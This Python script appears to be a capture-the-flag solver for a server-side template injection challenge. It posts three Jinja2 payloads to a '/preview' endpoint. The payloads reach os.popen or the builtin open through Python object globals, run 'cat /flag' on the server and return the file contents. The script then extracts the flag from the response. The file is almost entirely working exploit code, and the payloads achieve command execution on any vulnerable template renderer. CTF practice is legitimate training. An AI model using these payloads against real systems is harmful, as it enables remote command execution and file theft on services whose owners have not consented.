#!/usr/bin/env python3
import re
import sys

import requests

FLAG_RE = re.compile(r"flag\{[^}]+\}")

PAYLOADS = [
    "{{ lipsum.__globals__.os.popen('cat /flag').read() }}",
    "{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}",
    "{{ self.__init__.__globals__.__builtins__.open('/flag').read() }}",
]


def solve(host="127.0.0.1", port=8080):
    base = f"http://{host}:{port}"
    for payload in PAYLOADS:
        response = requests.post(
            base + "/preview",
            data={"name": "guest", "template": payload},
            timeout=5,
        )
        match = FLAG_RE.search(response.text)
        if match:
            return match.group(0)
    return None


if __name__ == "__main__":
    target_host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    flag = solve(target_host, target_port)
    if not flag:
        print("flag not found", file=sys.stderr)
        sys.exit(1)
    print(flag)
